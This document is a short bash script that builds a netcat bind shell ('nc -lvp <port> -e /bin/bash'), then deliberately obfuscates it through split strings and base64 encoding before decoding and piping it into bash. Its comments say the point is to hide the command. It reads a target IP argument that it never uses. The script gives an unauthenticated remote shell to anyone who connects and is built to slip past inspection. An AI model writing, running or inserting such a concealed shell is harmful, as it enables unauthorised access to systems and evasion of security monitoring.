#!/bin/bash

# Obfuscated variable names and splitting key parts
trgt=$(echo $1 | tr -d ' ')  # Target IP with whitespace removed for extra confusion
prt_num=$(echo $2 | tr -d ' ')  # Port number

# Break the Netcat command into pieces for added obfuscation
cmd1="nc"
cmd2="-lvp"
cmd3="-e"
shell="/bin/bash"

# Encode the broken-up command into Base64 for further obfuscation
final_cmd=$(echo "$cmd1 $cmd2 $prt_num $cmd3 $shell" | base64)

# Adding extra obfuscation by renaming the variables and further breaking up the decode part
part1=$(echo "$final_cmd" | cut -c 1-8)  # First part of Base64 encoded command
part2=$(echo "$final_cmd" | cut -c 9-)    # Remaining part of Base64 encoded command

# Decoding and executing the obfuscated Netcat command
echo "$part1$part2" | base64 --decode | bash
